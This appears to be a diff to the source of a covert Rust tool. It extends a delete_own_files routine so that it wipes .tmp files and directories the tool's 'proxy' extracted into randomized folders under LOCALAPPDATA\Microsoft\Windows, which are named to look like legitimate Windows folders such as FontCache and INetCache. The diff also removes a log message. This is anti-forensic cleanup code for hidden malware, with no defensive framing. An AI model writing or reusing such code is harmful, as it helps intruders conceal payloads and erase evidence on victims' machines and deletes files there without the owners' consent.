@@ -82,11 +82,34 @@ fn delete_own_files() {
         }
     }
 
-    // Proxy framework temp extractions
+    // Proxy framework temp extractions (legacy path)
     let proxy_fw_dir = temp.join("proxy_fw");
     if proxy_fw_dir.exists() {
         let _ = fs::remove_dir_all(&proxy_fw_dir);
-        eprintln!("[+] Deleted proxy_fw temp directory");
+    }
+
+    // Stash paths under LOCALAPPDATA\Microsoft\Windows\...
+    // The proxy extracts to randomized paths there; clean known patterns
+    if let Ok(appdata) = std::env::var("LOCALAPPDATA") {
+        let base = Path::new(&appdata).join("Microsoft\\Windows");
+        for subdir in ["FileCoAuth", "Explorer", "INetCache\\IE", "FontCache"].iter() {
+            let dir = base.join(subdir);
+            if let Ok(entries) = fs::read_dir(&dir) {
+                for entry in entries.flatten() {
+                    if entry.path().is_dir() {
+                        if let Ok(files) = fs::read_dir(entry.path()) {
+                            for f in files.flatten() {
+                                let name = f.file_name().to_string_lossy().to_lowercase();
+                                if name.ends_with(".tmp") {
+                                    let _ = fs::remove_file(f.path());
+                                }
+                            }
+                        }
+                        let _ = fs::remove_dir(entry.path());
+                    }
+                }
+            }
+        }
     }
 }
 
